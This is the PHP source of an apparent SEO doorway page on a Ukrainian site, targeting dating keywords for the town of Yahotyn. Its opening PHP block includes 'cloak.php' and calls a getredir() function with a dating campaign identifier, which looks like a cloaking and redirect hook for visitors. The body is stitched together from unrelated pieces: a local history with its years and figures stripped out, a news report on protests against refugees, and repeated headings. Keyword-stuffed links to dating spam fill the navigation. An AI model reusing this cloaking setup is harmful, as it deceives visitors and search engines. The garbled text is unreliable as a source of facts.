<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bc%d1%96%d1%81%d1%86%d1%8f+%d0%bf%d1%96%d0%b4%d0%ba%d0%bb%d1%8e%d1%87%d0%b5%d0%bd%d0%bd%d1%8f+%d0%af%d0%b3%d0%be%d1%82%d0%b8%d0%bd+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Історія міста</title>
	<meta name="description" content="Яготи́н — місто в Україні, на Придніпровській низовині, розташоване над Під час франко-російської війни був місцем формування 6-го козацького." />
	<link rel="canonical" href="https://masage.od.ua/img/137/fobe-mstsya-pdklyuchennya-yagotin.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/zax-bezkoshtovn-sayti-znayomstv.php">безкоштовні сайти знайомств місто в Євпаторія Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/196/jura-cholovch-pobachennya.php">чоловічі побачення Жмеринка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/106/lalu-oblast-shvidksnih.php">область швидкісних знайомств Часів Яр Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Місця підключення Яготин Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Усередині надзвичайно простора і світла. Поверхностные замечания по дороге от Москвы в Малороссию к осени г.</p><strong><a id='c1'></a><h2>На Київщині бунт проти «сирійських біженців». Хто «накручує» яготинців?</h2></strong><p>Та на жаль, в р. Зараз ведуться роботи по його відновленню. Було споруджено й ряд промислових підприємств. Німець Штром заснував році панчішну фабрику на місцевій сировині, де діти яготинських кріпаків на двох верстатах виготовляли рукавиці, повстяні і шовкові панчохи. За даними року, більшість яготинців — близько осіб — були кріпаки й лише належали до козаків.</p>
<p>На кріпосній суконній мануфактурі робітників виготовляли за рік до аршин тонкого й грубого «солдатського» сукна, вартість виробленої продукції досягала 60 тис. Готове сукно продавало на Прилуцьких, Харківських та інших ярмарках України. В наступні роки за планом архітектора Менеласа збудовано розкішний палац з павільйонами. Запрошений з Франції садівник Пельц спланував англійський парк, теплиці, оранжереї з заморськими рослинами, виноградник, побудував погреби для зберігання вина. Все це було разючим контрастом до тих умов, у яких жили селяни.</p><strong><a id='c2'></a><h2>На Київщині бунт проти «сирійських біженців». Хто «накручує» яготинців?</h2></strong><p>Лікар графа Розумовського німець Отто фон Гун у своїх спогадах розповідав про скрутне матеріальне становище кріпаків, убогість плетених з лози і обмазаних глиною хат, з малесенькими напівпрозорими віконцями. Пан та управителі маєтком за найменшу провину жорстоко карали селян. В ній стояв дубовий ослін та лежали різки. У році Яготинський маєток з душами селян-кріпаків перейшов до князя М. Рєпніна-Волконського, як посаг за дружиною — В. Рєпнін — був високоосвіченою людиною передових на той час поглядів і обіймав високі посади.</p>
		
			<br><ul>
			
				<li>Центральна виборча комісія України - WWW відображення ІАС "Місцеві вибори ".</li>
			
				<li>Навігаційне меню.</li>
			
				<li>пригодницькі побачення Сторожинець Україна.</li>
			
			</ul>
		
	<p>Волконським М. Рєпнін після р. Освіченою і благородною людиною була і дочка Рєпніна — Варвара Миколаївна. Вона цікавилась історією та культурою рідного краю.</p><strong><a id='c3'></a><h2>Рішення № 93273539, 26.11.2021, Яготинський районний суд Київської області</h2></strong><p>Всі Рєпніни цікавились й прихильно ставилися до творчості Т. Шевченка, цінували його художню майстерність. Все це й сприяло перебуванню у них Великого Кобзаря. Шевченко приїздив до Яготина у супроводі колишнього декабриста О. Капніста, який познайомив поета з Рєпніними, а також кілька разів сам. У липні року він відвідав Яготин двічі, а з жовтня року по січень року жив у флігелі князівського палацу, стіни якого прикрасив власними малюнками, користувався бібліотекою Рєпніних, малював портрети, краєвиди та писав твори.</p>
<p>Рєпніна допомагала поетові, переписуючи його рукописи, перекладаючи іноземну літературу. У Рєпніних Шевченко читав свої твори «Слепая», «Катерина». Там він зустрічав чимало прихильників свого таланту, людей передових поглядів, освічених і обдарованих. Це — сестри Псьол — художниця і поетеса, P.</p>
<p>Штрандман, журналіст за професією, пізніше член антикріпосницького гуртка петрашевців, лікар М. Фішер та ін. Цікавою була дружба Т. Шевченка з маляром і дяком Н. Поет часто бував у родині Філянських. З Філянськими Шевченко дискутував на різні теми, після чого часто виходив з ними на вигін над Іржавцем і разом з кріпаками співали народних пісень. Перебування Т. Шевченка в Яготині позитивно вплинуло на розвиток творчості поета.</p>
<p>Тут Великий Кобзар записав народну пісню «Соколе мій, чоловіче», написав поему «Тризна», яку присвятив В. З мистецьких творів Т. Шевченка, виконаних у Яготині, відомі дві копії портрета М. Рєпніна, портрет дітей князя, а також автопортрет, подарований В. Часто зупинявся поет в Яготині і під час своєї подорожі по Україні в році, яка закінчилася його арештом і засланням.</p>
<p>Шевченко з далекого заслання до В. Рєпніної у березні року. В роки тяжких для поета випробувань яготинські друзі не забули його. Рєпніна, сестри Псьол підтримували поета морально, писали йому листи, надсилали книги. Щирий друг поета В. Рєпніна клопотала про полегшення долі Шевченка, зверталася навіть до шефа жандармів графа Орлова.</p>
<p>Одержавши волю й подорожуючи в році Полтавщиною і Київщиною, Т. Шевченко прибув у Яготин і зупинився у Філянського.</p>
		
			
				<div>Мальовничий Яготин 2019</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/FnmLihAIRkI' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>При О. Розумовському маєток було перебудовано та насаджено парк. Від великої садиби до нашого часу збереглися залишки розкішного парку та один з корпусів палацу кінця 18 — початку 19 ст. Широко представлені твори народної художниці Катерини Білокур, яка прославила яготинську землю на весь світ. За даними року, школи в Яготині не було, парафіяльне училище було в Жоравці, а повітове — у Пирятині. На стан освіти яготинців ніяк не вплинуло те, що граф К. Розумовський був президентом імператорської академії наук, а його син Олексій — міністром народної освіти — pp. Недоступною для селян була багата панська бібліотека.</p>
<p>Уже згадуваний Отто фон Гун писав і про нестачу медичної допомоги в Яготині. Становище істотно не змінювалося і в наступні роки. Під час реформи року селянам Яготина наділено десятин землі, за що вони сплачували щорічно карбованців.</p><a id='c4'></a><h3>Дізналися зі ЗМІ</h3><p>У пореформений період в містечку зростає торгівля і він стає одним із центрів торгівлі Пирятинського повіту — «багатолюдним і торговельним містечком». Щорічно збиралося мінімум 6 ярмарків на рік. Пристосовуючись до нових умов, все більше капіталізували своє господарство поміщики Рєпніни. У 60—х роках у їхньому маєтку діяла фабрика льняного прядива. Продукція збувалася як на місцевому ринку, так і за кордоном. На кінному заводі розводилися напівпородисті англійські коні; на тваринницьких фермах — велика рогата худоба, каракулеві вівці, свині; на озерах і ставках — тисячі гусей і качок.</p>
<p>Збагачувалася і сільська буржуазія. У року заможний селянин І. Перша черга комплексу розрахована на ліжко-місце. Останніми днями в Яготині часто проходять протестні акції та народні віче — люди проти того, щоб у їхньому місті відкрився пункт тимчасового розміщення біженців. Будівництво комплексу розпочалося у році, а от про його призначення місцеві дізналися лише нещодавно.</p>
		
			<br><ul>
			
				<li>Проєкти рішень виконавчого комітету Яготинської міської ради за рік | Яготинська міська рада.</li>
			
				<li>Історія міста | Яготинська міська рада.</li>
			
				<li>Поточні проекти - Оператор ГТС України;</li>
			
			</ul>
		
	<p>Переконані, що до пункту заселять сирійських біженців, тому вирішили, що діятимуть на випередження. Вони заслуговують на більше, ніж сирійці, вони захищають нашу батьківщину, а сирійці чомусь свою батьківщину захищать не хочуть — виїжджають», — зазначає в коментарі Радіо Свобода Армен Шахарьянц , депутат Київської обласної ради. Відповідне оголошення із запрошенням бійців АТО та їхніх сімей заселитися в ці приміщення Армен Шахарьянц розмістив у мережі Фейсбук, і воно швидко поширилось.</p>
<p>Депутат розповідає, що отримує чимало повідомлень про готовність людей приїхати і заселитись. Місцеві жителі вважають, що біженців можуть заселити вночі без погодження з громадою. Сьогодні не було приїжджих, були тільки два депутати облради: я і Микола Семеняка. Ми спитали думку народу, люди категорично проти, зібрались коло того центру й вирішили поставити блокпост, щоб ніхто не завіз іноземців, поки люди сплять. Щоб не поставили нас перед фактом, що люди там уже живуть. Тоді вже буде дуже погано», — розповідає Армен Шахарьянц.</p>
<p>Яготинці переконані, що мають право на такі дії, бо, за словами обласного депутата, з ними ніхто не погоджував проживання на території їхньої громади біженців. Місцева влада Яготина підтримує жителів у їхньому небажанні бачити у місті мігрантів, каже Армен Шахарьянц. Є в мережі і застережливі думки. Леся Литвинова , координатор «Волонтерського центру на Фроловській», реагуючи на цей заклик, висловилась, що, хоча і вважає несправедливим те, що відбувається, акція із заселенням, на її думку, є «самозахопленням».</p>
<p>Тому волонтер застерігає тих, хто має намір заселитися з дітьми у помешкання в такий спосіб.</p>
		
	<p>Народні віче та протести у Яготині раніше приїжджали підтримувати активісти цивільного корпусу «Азов» та «Правого сектору» з Києва. У нас критична ситуація в трьох регіонах: у Криму, Донецькій та Луганській областях. Чому ми маємо селити біженців з інших країн, якщо в нас не забезпечені житлом навіть свої переміщені особи?</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/352/kenec-nch-pobachen.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/291/xuhyq-tsentralna-shvidksna-data.php">центральна швидкісна дата в Кролевець Україна</a></li><li><a href="https://masage.od.ua/img/406/dex-zrl-znayomstva.php">зрілі знайомства Бережани Україна</a></li><li><a href="https://masage.od.ua/img/494/geqod-plyazh-pdklyuchiti.php">пляж підключити Тетіїв Україна</a></li><li><a href="https://masage.od.ua/img/422/myfi-agentstva-svata-vatutne.php">агентства свата Ватутіне Україна</a></li><li><a href="https://masage.od.ua/img/428/my-znayomstva-plyus.php">знайомства плюс розмір в Городня Україна</a></li><li><a href="https://masage.od.ua/img/361/zik-pdklyuchiti-sayt.php">підключити сайт поблизу Селидове Україна</a></li><li><a href="https://masage.od.ua/img/103/suji-bezkoshtovn-sayti.php">безкоштовні сайти знайомств місто в Попасна Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#c1'>На Київщині бунт проти «сирійських біженців». Хто «накручує» яготинців?</a></li>
<li><a href='#c2'>На Київщині бунт проти «сирійських біженців». Хто «накручує» яготинців?</a></li>
<li><a href='#c3'>Рішення № 93273539, 26.11.2021, Яготинський районний суд Київської області</a></li>
<li><a href='#c4'>Дізналися зі ЗМІ</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/211/bipiq-tsentralna-shvidksna.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>